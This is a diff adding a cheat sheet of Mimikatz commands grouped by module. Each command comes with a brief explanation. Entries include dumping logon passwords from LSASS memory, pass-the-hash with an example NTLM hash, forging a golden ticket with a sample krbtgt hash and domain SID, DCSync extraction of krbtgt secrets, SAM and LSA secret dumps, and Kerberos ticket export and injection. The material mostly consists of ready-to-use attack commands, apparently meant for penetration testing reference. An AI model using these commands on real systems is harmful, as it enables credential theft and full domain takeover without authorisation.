@@ -1,0 +1,89 @@
+General Module
+
+    privilege::debug: Grants the command execution process debug privileges. This may be required for accessing certain processes or memory.
+
+    log: Enables logging of output to the specified file (customlogfilename.log).
+
+    log customlogfilename.log: Specifies a custom log file name to log output into.
+
+Sekurlsa Module
+
+    sekurlsa::logonpasswords: Dumps logon password data from memory.
+
+    sekurlsa::logonPasswords full: Same as the above, but with additional detail.
+
+    sekurlsa::tickets /export: Exports Kerberos tickets from memory.
+
+    sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd: Pass-the-hash attack with specified NTLM hash. Runs a command prompt (cmd) as a specified user.
+
+Kerberos Module
+
+    kerberos::list /export: Lists and exports Kerberos tickets.
+
+    kerberos::ptt c:\chocolate.kirbi: Injects a Kerberos ticket (chocolate.kirbi) from the specified file path.
+
+    kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi: Generates a golden ticket, which can provide full domain admin privileges, and saves it to chocolate.kirbi.
+
+Crypto Module
+
+    crypto::capi: Provides access to the CAPI (Cryptographic Application Programming Interface) functionality.
+
+    crypto::cng: Provides access to the CNG (Cryptography Next Generation) functionality.
+
+    crypto::certificates /export: Exports certificates.
+
+    crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE: Exports certificates from the local machine's certificate store.
+
+    crypto::keys /export: Exports cryptographic keys.
+
+    crypto::keys /machine /export: Exports cryptographic keys from the machine.
+
+Vault & LSADump Module
+
+    vault::cred: Dumps credentials from the Windows vault.
+
+    vault::list: Lists items stored in the Windows vault.
+
+    token::elevate: Elevates the privileges of the current token to a higher level.
+
+    token::revert: Reverts the token to its original privilege level.
+
+    lsadump::sam: Dumps SAM database information.
+
+    lsadump::secrets: Dumps stored secrets.
+
+    lsadump::cache: Dumps the logon cache.
+
+    lsadump::dcsync /user:domain\krbtgt /domain:lab.local: Synchronizes domain controller data and pulls secrets.
+
+PTH Module
+
+    sekurlsa::pth: Pass-the-hash attacks using either NTLM or AES hashes. In some examples, it runs cmd.exe as the user.
+
+EKeys Module
+
+    sekurlsa::ekeys: Dumps encryption keys.
+
+DPAPI Module
+
+    sekurlsa::dpapi: Dumps DPAPI master keys.
+
+Minidump Module
+
+    sekurlsa::minidump lsass.dmp: Dumps a memory dump of the LSASS process (lsass.dmp) which can then be analyzed for secrets.
+
+PTT Module
+
+    kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi: Injects a Kerberos ticket for the specified user.
+
+Golden/Silver Ticket Module
+
+    kerberos::golden: These commands generate golden tickets with different attributes such as user, domain, and SID.
+
+TGT Module
+
+    kerberos::tgt: Dumps Kerberos ticket-granting tickets.
+
+Purge Module
+
+    kerberos::purge: Clears Kerberos ticket cache.
